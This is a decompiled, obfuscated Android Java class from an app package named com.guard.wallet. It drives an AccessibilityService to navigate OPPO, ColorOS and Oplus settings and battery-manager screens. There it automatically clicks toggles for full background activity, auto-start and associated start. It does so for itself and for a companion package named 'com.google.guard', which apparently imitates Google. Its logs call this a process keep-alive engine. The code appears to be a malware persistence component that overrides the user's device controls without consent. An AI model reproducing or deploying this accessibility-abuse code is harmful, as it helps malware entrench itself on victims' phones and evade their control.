package o;

import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import com.guard.wallet.MainApplication;
import com.guard.wallet.condition.StringCondition;
import com.guard.wallet.entity.UiObject;
import com.guard.wallet.filter.CombineFilter;
import com.guard.wallet.filter.CombineFilterWithChild;
import com.guard.wallet.req.ListenWindow;
import com.guard.wallet.resp.PowerControlStateVO;
import com.guard.wallet.service.MyAccessibilityService;
import java.util.Collections;
import java.util.LinkedList;
import java.util.Objects;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicReference;
import java.util.concurrent.locks.ReentrantLock;

public final class v extends c {
   public static final int v = 0;
   public final AtomicReference r = new AtomicReference<>(r.e.b);
   public final AtomicBoolean s = new AtomicBoolean(false);
   public final AtomicBoolean t = new AtomicBoolean(false);
   public final AtomicBoolean u = new AtomicBoolean(false);

   public v() {
      super(w0(), "com.android.settings");

      try {
         ScheduledExecutorService var2 = super.p;
         u var1 = new u(this, 4);
         var2.schedule(var1, 100L, TimeUnit.SECONDS);
      } catch (Exception var3) {
         a1.q.s("o.v", var3);
      }
   }

   public static ListenWindow A0(String var0) {
      ListenWindow var1 = new ListenWindow("com.android.settings", "com.android.settings.applications.InstalledAppDetailsTop");
      o.b.q(32, o.b.r(var1), var1).add(16384);
      var1.setMatchs(new LinkedList<>());
      var1.getMatchs().add(o.c.H(var0));
      return var1;
   }

   public static CombineFilter B0() {
      if (!a1.q.B(com.guard.wallet.utils.f.b("COLORS_SETTINGS_POWER_MANAGE_TEXT"))) {
         CombineFilter var0 = new CombineFilter();
         StringCondition var1 = o.b.b(var0, a.a.c(var0, "className", "android.widget.TextView"), "text");
         o.b.v("COLORS_SETTINGS_POWER_MANAGE_TEXT", var1, var0, var1);
         return var0;
      } else {
         return null;
      }
   }

   public static CombineFilter C0() {
      if (!a1.q.B(com.guard.wallet.utils.f.b("COLORS_SETTINGS_POWER_MANAGE_2_TEXT"))) {
         CombineFilter var1 = new CombineFilter();
         StringCondition var0 = o.b.b(var1, a.a.c(var1, "className", "android.widget.TextView"), "text");
         o.b.v("COLORS_SETTINGS_POWER_MANAGE_2_TEXT", var0, var1, var0);
         return var1;
      } else {
         return null;
      }
   }

   public static CombineFilter b0() {
      CombineFilter var1 = new CombineFilter();
      StringCondition var0 = o.b.b(var1, a.a.c(var1, "className", "android.widget.TextView"), "text");
      o.b.v("COLORS_SETTINGS_ALLOW_APP_IN_BACKGROUND_TEXT", var0, var1, var0);
      return var1;
   }

   public static CombineFilter c0() {
      CombineFilter var1 = new CombineFilter();
      StringCondition var0 = o.b.b(var1, a.a.c(var1, "className", "android.widget.TextView"), "text");
      o.b.v("COLORS_SETTINGS_ALLOW_APP_AUTO_START_TEXT", var0, var1, var0);
      return var1;
   }

   public static CombineFilter d0() {
      CombineFilter var1 = new CombineFilter();
      StringCondition var0 = o.b.b(var1, a.a.c(var1, "className", "android.widget.Button"), "text");
      o.b.v("COLORS_SETTINGS_ALLOW_BUTTON_TEXT", var0, var1, var0);
      return var1;
   }

   public static CombineFilter e0() {
      CombineFilter var1 = new CombineFilter();
      StringCondition var0 = o.b.b(var1, a.a.c(var1, "className", "android.widget.TextView"), "text");
      o.b.v("COLORS_SETTINGS_ALLOW_FULL_IN_BACKGROUND_TEXT", var0, var1, var0);
      return var1;
   }

   public static CombineFilter f0() {
      CombineFilter var1 = new CombineFilter();
      StringCondition var0 = o.b.b(var1, a.a.c(var1, "className", "android.widget.TextView"), "text");
      var0.setContains(com.guard.wallet.utils.f.b("COLORS_SETTINGS_ALLOW_APP_RELATE_START_TEXT"));
      var1.getStringConditions().add(var0);
      return var1;
   }

   public static ListenWindow g0() {
      ListenWindow var0 = new ListenWindow("com.oplus.battery", "androidx.appcompat.app.b");
      o.b.q(32, o.b.r(var0), var0).add(16384);
      var0.setMatchs(new LinkedList<>());
      var0.getMatchs().add(d0());
      return var0;
   }

   public static ListenWindow h0() {
      ListenWindow var0 = new ListenWindow("com.oplus.battery", null);
      o.b.q(32, o.b.r(var0), var0).add(16384);
      var0.setMatchs(new LinkedList<>());
      var0.getMatchs().add(d0());
      return var0;
   }

   public static CombineFilter i0() {
      CombineFilter var0 = new CombineFilter();
      StringCondition var1 = o.b.b(var0, a.a.c(var0, "className", "android.widget.TextView"), "text");
      var1.setContains(com.guard.wallet.utils.f.b("COLORS_APP_IN_BACKGROUND_TEXT"));
      var0.getStringConditions().add(var1);
      return var0;
   }

   public static ListenWindow n0() {
      ListenWindow var0 = new ListenWindow("com.oplus.battery", "com.coui.appcompat.dialog.app.a");
      o.b.q(32, o.b.r(var0), var0).add(16384);
      var0.setMatchs(new LinkedList<>());
      var0.getMatchs().add(d0());
      return var0;
   }

   public static ListenWindow o0() {
      ListenWindow var0 = new ListenWindow("com.coloros.oppoguardelf", null);
      o.b.q(32, o.b.r(var0), var0).add(16384);
      var0.setMatchs(new LinkedList<>());
      var0.getMatchs().add(d0());
      return var0;
   }

   public static ListenWindow p0() {
      ListenWindow var0 = new ListenWindow("com.coloros.oppoguardelf", "android.widget.FrameLayout");
      o.b.q(32, o.b.r(var0), var0).add(16384);
      var0.setMatchs(new LinkedList<>());
      var0.getMatchs().add(i0());
      return var0;
   }

   public static ListenWindow q0() {
      ListenWindow var0 = new ListenWindow("com.coloros.oppoguardelf", "com.coloros.powermanager.fuelgaue.PowerControlActivity");
      o.b.q(32, o.b.r(var0), var0).add(16384);
      return var0;
   }

   public static ListenWindow v0(String var0) {
      ListenWindow var1 = new ListenWindow("com.android.settings", "android.widget.FrameLayout");
      o.b.q(32, o.b.r(var1), var1).add(16384);
      var1.setMatchs(new LinkedList<>());
      var1.getMatchs().add(o.c.H(var0));
      return var1;
   }

   public static LinkedList w0() {
      LinkedList var0 = new LinkedList();
      var0.add(o.c.J());
      var0.add(A0(com.guard.wallet.utils.g.x0()));
      var0.add(A0(com.guard.wallet.utils.g.e()));
      var0.add(v0(com.guard.wallet.utils.g.x0()));
      var0.add(v0(com.guard.wallet.utils.g.e()));
      var0.add(y0());
      var0.add(q0());
      var0.add(g0());
      var0.add(n0());
      var0.add(h0());
      var0.add(o0());
      var0.add(z0());
      return var0;
   }

   public static ListenWindow x0() {
      ListenWindow var0 = new ListenWindow("com.oplus.battery", "android.widget.FrameLayout");
      o.b.q(32, o.b.r(var0), var0).add(16384);
      var0.setMatchs(new LinkedList<>());
      var0.getMatchs().add(i0());
      return var0;
   }

   public static ListenWindow y0() {
      ListenWindow var0 = new ListenWindow("com.oplus.battery", "com.oplus.powermanager.fuelgaue.PowerControlActivity");
      o.b.q(32, o.b.r(var0), var0).add(16384);
      return var0;
   }

   public static ListenWindow z0() {
      ListenWindow var0 = new ListenWindow("com.oplus.battery", "com.oplus.startupapp.view.StartupAppListActivity");
      o.b.q(32, o.b.r(var0), var0).add(16384);
      return var0;
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public final void D0(String var1) {
      Exception var10000;
      label58: {
         PowerControlStateVO var2;
         try {
            var2 = com.guard.wallet.utils.h.k(var1);
            var2.setPackageName(var1);
         } catch (Exception var8) {
            var10000 = var8;
            boolean var10001 = false;
            break label58;
         }

         AtomicBoolean var3 = this.s;

         try {
            if (var3.get()) {
               var2.setAllowAllFullBackground(var3.get());
            }
         } catch (Exception var7) {
            var10000 = var7;
            boolean var12 = false;
            break label58;
         }

         var3 = this.t;

         try {
            if (var3.get()) {
               var2.setAllowAutoStart(var3.get());
            }
         } catch (Exception var6) {
            var10000 = var6;
            boolean var13 = false;
            break label58;
         }

         var3 = this.u;

         try {
            if (var3.get()) {
               var2.setAllowRelateStart(var3.get());
            }
         } catch (Exception var5) {
            var10000 = var5;
            boolean var14 = false;
            break label58;
         }

         try {
            var2.setRetryCount(var2.getRetryCount() + 1);
            com.guard.wallet.utils.h.L(var2);
            Log.d("o.v", var1.concat(" 进程保活策略已保存"));
            var1.concat(" 进程保活策略已保存");
            return;
         } catch (Exception var4) {
            var10000 = var4;
            boolean var15 = false;
         }
      }

      Exception var9 = var10000;
      a1.q.s("o.v", var9);
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   @Override
   public final void Z() {
      ReentrantLock var1 = super.o;
      if (var1.tryLock()) {
         label78: {
            Exception var10000;
            label84: {
               try {
                  if (this.T()) {
                     break label78;
                  }

                  Log.d("o.v", "准备结束本地保活自动化引擎");
                  com.guard.wallet.helper.g.h(100);
                  this.X();
                  if (MyAccessibilityService.P() != null) {
                     MyAccessibilityService.P().x();
                  }
               } catch (Exception var9) {
                  var10000 = var9;
                  boolean var10001 = false;
                  break label84;
               }

               AtomicReference var2 = this.r;

               try {
                  if (Objects.equals(var2.get(), r.e.c)) {
                     this.D0(MainApplication.getAppContext().getPackageName());
                  }
               } catch (Exception var8) {
                  var10000 = var8;
                  boolean var11 = false;
                  break label84;
               }

               try {
                  if (Objects.equals(var2.get(), r.e.d)) {
                     this.D0("com.google.guard");
                  }
               } catch (Exception var7) {
                  var10000 = var7;
                  boolean var12 = false;
                  break label84;
               }

               try {
                  super.p.shutdownNow();
                  com.guard.wallet.thread.l.a(super.c);
                  super.n.clear();
                  if (a1.q.M()) {
                     com.guard.wallet.utils.g.T0(5);
                  }
               } catch (Exception var6) {
                  var10000 = var6;
                  boolean var13 = false;
                  break label84;
               }

               label62: {
                  try {
                     if (!h.e.S().U() && Objects.equals(0, com.guard.wallet.utils.d.g())) {
                        MainApplication.getInstance().offerStrategyEvent("PREPARE_LEAVE_PIP");
                        break label62;
                     }
                  } catch (Exception var5) {
                     var10000 = var5;
                     boolean var14 = false;
                     break label84;
                  }

                  try {
                     e.b.d();
                     com.guard.wallet.helper.g.c();
                  } catch (Exception var4) {
                     var10000 = var4;
                     boolean var15 = false;
                     break label84;
                  }
               }

               try {
                  Log.d("o.v", "已结束本地保活自动化引擎");
                  o.c.W();
                  this.d();
                  break label78;
               } catch (Exception var3) {
                  var10000 = var3;
                  boolean var16 = false;
               }
            }

            Exception var10 = var10000;
            a1.q.s("o.v", var10);
         }

         var1.unlock();
      }
   }

   public final boolean j0() {
      try {
         LinkedList var1 = new LinkedList();
         var1.add(g0());
         var1.add(n0());
         var1.add(h0());
         var1.add(o0());
         if (this.q(var1)) {
            Log.d("o.v", "已进入是否完全允许对话框");
            return true;
         }
      } catch (Exception var2) {
         a1.q.s("o.v", var2);
      }

      return false;
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public final boolean k0() {
      Exception var10000;
      label37: {
         String var1;
         label32: {
            try {
               if (Objects.equals(this.r.get(), r.e.c)) {
                  var1 = com.guard.wallet.utils.g.x0();
                  break label32;
               }
            } catch (Exception var5) {
               var10000 = var5;
               boolean var10001 = false;
               break label37;
            }

            try {
               var1 = com.guard.wallet.utils.g.e();
            } catch (Exception var4) {
               var10000 = var4;
               boolean var7 = false;
               break label37;
            }
         }

         try {
            LinkedList var2 = new LinkedList();
            var2.add(A0(var1));
            var2.add(v0(var1));
            if (this.q(var2)) {
               Log.d("o.v", "已进入App详情窗口");
               return true;
            }

            return false;
         } catch (Exception var3) {
            var10000 = var3;
            boolean var8 = false;
         }
      }

      Exception var6 = var10000;
      a1.q.s("o.v", var6);
      return false;
   }

   public final boolean l0() {
      try {
         LinkedList var1 = new LinkedList();
         var1.add(y0());
         var1.add(x0());
         var1.add(q0());
         var1.add(p0());
         if (this.q(var1)) {
            Log.d("o.v", "已进入App耗电管理窗口");
            return true;
         }
      } catch (Exception var2) {
         a1.q.s("o.v", var2);
      }

      return false;
   }

   public final boolean m0() {
      try {
         if (this.q(Collections.singletonList(z0()))) {
            Log.d("o.v", "已进入自启动管理窗口");
            return true;
         }
      } catch (Exception var2) {
         a1.q.s("o.v", var2);
      }

      return false;
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public final boolean r0() {
      Exception var10000;
      label59: {
         UiObject var2;
         try {
            CombineFilterWithChild var1 = new CombineFilterWithChild(o.c.K(), e0());
            var2 = this.k().findOneByCombineWithChild(var1);
         } catch (Exception var6) {
            var10000 = var6;
            boolean var10001 = false;
            break label59;
         }

         UiObject var8 = var2;
         if (var2 == null) {
            try {
               CombineFilterWithChild var9 = new CombineFilterWithChild(o.c.K(), b0());
               var8 = this.k().findOneByCombineWithChild(var9);
            } catch (Exception var5) {
               var10000 = var5;
               boolean var13 = false;
               break label59;
            }
         }

         String var10;
         if (var8 != null) {
            try {
               Log.d("o.v", "完全允许后台行为栏目查找成功");
               var11 = this.R(var8, 0);
               if (var11.isClicked()) {
                  Log.d("o.v", "已点击完全允许后台行为");
               }
            } catch (Exception var4) {
               var10000 = var4;
               boolean var14 = false;
               break label59;
            }

            try {
               if (var11.isChecked()) {
                  Log.d("o.v", "已勾选完全允许后台行为");
                  com.guard.wallet.utils.g.T0(10);
                  if (!this.j0()) {
                     this.s.set(true);
                     return true;
                  }

                  return false;
               }
            } catch (Exception var7) {
               var10000 = var7;
               boolean var15 = false;
               break label59;
            }

            var10 = "未勾选完全允许后台行为";
         } else {
            var10 = "完全允许后台行为栏目查找失败";
         }

         try {
            Log.e("o.v", var10);
            return false;
         } catch (Exception var3) {
            var10000 = var3;
            boolean var16 = false;
         }
      }

      Exception var12 = var10000;
      a1.q.s("o.v", var12);
      return false;
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public final boolean s0() {
      Exception var10000;
      label51: {
         UiObject var9;
         try {
            CombineFilterWithChild var2 = new CombineFilterWithChild(o.c.K(), c0());
            var9 = this.k().findOneByCombineWithChild(var2);
         } catch (Exception var8) {
            var10000 = var8;
            boolean var10001 = false;
            break label51;
         }

         label48:
         if (var9 != null) {
            try {
               Log.d("o.v", "自启动栏目查找成功");
               var10 = this.R(var9, 5);
               if (var10.isClicked()) {
                  Log.d("o.v", "已点击允许自启动");
               }
            } catch (Exception var6) {
               var10000 = var6;
               boolean var13 = false;
               break label48;
            }

            boolean var1;
            try {
               var1 = var10.isChecked();
            } catch (Exception var5) {
               var10000 = var5;
               boolean var14 = false;
               break label48;
            }

            AtomicBoolean var11 = this.t;
            if (var1) {
               try {
                  Log.d("o.v", "已勾选允许自启动");
                  var11.set(true);
                  return true;
               } catch (Exception var3) {
                  var10000 = var3;
                  boolean var15 = false;
               }
            } else {
               try {
                  Log.e("o.v", "未勾选允许自启动");
                  var11.set(false);
                  return false;
               } catch (Exception var4) {
                  var10000 = var4;
                  boolean var16 = false;
               }
            }
         } else {
            try {
               Log.e("o.v", "允许自启动栏目查找失败");
               return false;
            } catch (Exception var7) {
               var10000 = var7;
               boolean var17 = false;
            }
         }
      }

      Exception var12 = var10000;
      a1.q.s("o.v", var12);
      return false;
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public final boolean t0() {
      Exception var10000;
      label50: {
         UiObject var6;
         try {
            CombineFilterWithChild var1 = new CombineFilterWithChild(o.c.K(), f0());
            var6 = this.k().findOneByCombineWithChild(var1);
         } catch (Exception var4) {
            var10000 = var4;
            boolean var10001 = false;
            break label50;
         }

         String var7;
         if (var6 != null) {
            try {
               Log.d("o.v", "关联启动栏目查找成功");
               var8 = this.R(var6, 5);
               if (var8.isClicked()) {
                  Log.d("o.v", "已点击允许关联启动");
               }
            } catch (Exception var3) {
               var10000 = var3;
               boolean var10 = false;
               break label50;
            }

            try {
               if (var8.isChecked()) {
                  Log.d("o.v", "已勾选允许关联启动");
                  this.u.set(true);
                  return true;
               }
            } catch (Exception var5) {
               var10000 = var5;
               boolean var11 = false;
               break label50;
            }

            var7 = "未勾选允许关联启动";
         } else {
            var7 = "关联启动栏目查找失败";
         }

         try {
            Log.e("o.v", var7);
            return false;
         } catch (Exception var2) {
            var10000 = var2;
            boolean var12 = false;
         }
      }

      Exception var9 = var10000;
      a1.q.s("o.v", var9);
      return false;
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   @Override
   public final void u(AccessibilityEvent var1, String var2, String var3) {
      Exception var10000;
      label74: {
         try {
            if (this.T()) {
               return;
            }
         } catch (Exception var11) {
            var10000 = var11;
            boolean var10001 = false;
            break label74;
         }

         if (var1 != null) {
            try {
               super.u(var1, var2, var3);
            } catch (Exception var10) {
               var10000 = var10;
               boolean var19 = false;
               break label74;
            }
         }

         boolean var4;
         try {
            var4 = this.k0();
         } catch (Exception var9) {
            var10000 = var9;
            boolean var20 = false;
            break label74;
         }

         String var12 = super.c;
         ConcurrentLinkedQueue var14 = super.n;
         if (var4) {
            try {
               var14.remove("keepAliveInPowerControl");
               var14.remove("keepAliveInAndroidXDialog");
               var14.remove("keepAliveInStartup");
               if (!var14.contains("keepAliveInAppDetail")) {
                  var14.add("keepAliveInAppDetail");
                  u var16 = new u(this, 0);
                  com.guard.wallet.thread.l.c(var16, var12);
               }
            } catch (Exception var8) {
               var10000 = var8;
               boolean var21 = false;
               break label74;
            }
         }

         try {
            if (this.l0()) {
               var14.remove("keepAliveInAppDetail");
               var14.remove("keepAliveInAndroidXDialog");
               var14.remove("keepAliveInStartup");
               if (!var14.contains("keepAliveInPowerControl")) {
                  var14.add("keepAliveInPowerControl");
                  u var17 = new u(this, 1);
                  com.guard.wallet.thread.l.c(var17, var12);
               }
            }
         } catch (Exception var7) {
            var10000 = var7;
            boolean var22 = false;
            break label74;
         }

         try {
            if (this.j0()) {
               var14.remove("keepAliveInAppDetail");
               var14.remove("keepAliveInPowerControl");
               var14.remove("keepAliveInStartup");
               if (!var14.contains("keepAliveInAndroidXDialog")) {
                  var14.add("keepAliveInAndroidXDialog");
                  u var18 = new u(this, 2);
                  com.guard.wallet.thread.l.c(var18, var12);
               }
            }
         } catch (Exception var6) {
            var10000 = var6;
            boolean var23 = false;
            break label74;
         }

         try {
            if (this.m0()) {
               var14.remove("keepAliveInAppDetail");
               var14.remove("keepAliveInPowerControl");
               var14.remove("keepAliveInAndroidXDialog");
               if (!var14.contains("keepAliveInStartup")) {
                  var14.add("keepAliveInStartup");
                  u var15 = new u(this, 3);
                  com.guard.wallet.thread.l.c(var15, var12);
                  return;
               }
            }

            return;
         } catch (Exception var5) {
            var10000 = var5;
            boolean var24 = false;
         }
      }

      Exception var13 = var10000;
      a1.q.s("o.v", var13);
   }

   // $VF: Handled exception range with multiple entry points by splitting it
   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public final void u0() {
      AtomicBoolean var3 = this.s;

      Exception var10000;
      label64: {
         boolean var1;
         try {
            var1 = var3.get();
         } catch (Exception var10) {
            var10000 = var10;
            boolean var10001 = false;
            break label64;
         }

         if (!var1) {
            return;
         }

         AtomicReference var4 = this.r;

         try {
            var1 = Objects.equals(var4.get(), r.e.c);
         } catch (Exception var9) {
            var10000 = var9;
            boolean var13 = false;
            break label64;
         }

         r.e var2 = r.e.d;
         label52:
         if (var1) {
            label48: {
               try {
                  this.D0(MainApplication.getAppContext().getPackageName());
                  super.n.clear();
                  var3.set(false);
                  this.t.set(false);
                  this.u.set(false);
                  if (!com.guard.wallet.utils.h.r("com.google.guard") && com.guard.wallet.utils.g.d0("com.google.guard") != null) {
                     var4.set(var2);
                     com.guard.wallet.utils.g.Z0("com.google.guard");
                     Log.d("o.v", "已启动 ".concat("com.google.guard").concat(" 应用详情"));
                     "已启动 ".concat("com.google.guard").concat(" 应用详情");
                     break label48;
                  }
               } catch (Exception var7) {
                  var10000 = var7;
                  boolean var14 = false;
                  break label52;
               }

               try {
                  this.Z();
               } catch (Exception var6) {
                  var10000 = var6;
                  boolean var15 = false;
                  break label52;
               }
            }

            try {
               return;
            } catch (Exception var5) {
               var10000 = var5;
               boolean var16 = false;
            }
         } else {
            try {
               if (Objects.equals(var4.get(), var2)) {
                  this.D0("com.google.guard");
                  this.Z();
               }

               return;
            } catch (Exception var8) {
               var10000 = var8;
               boolean var17 = false;
            }
         }
      }

      Exception var12 = var10000;
      a1.q.s("o.v", var12);
   }
}
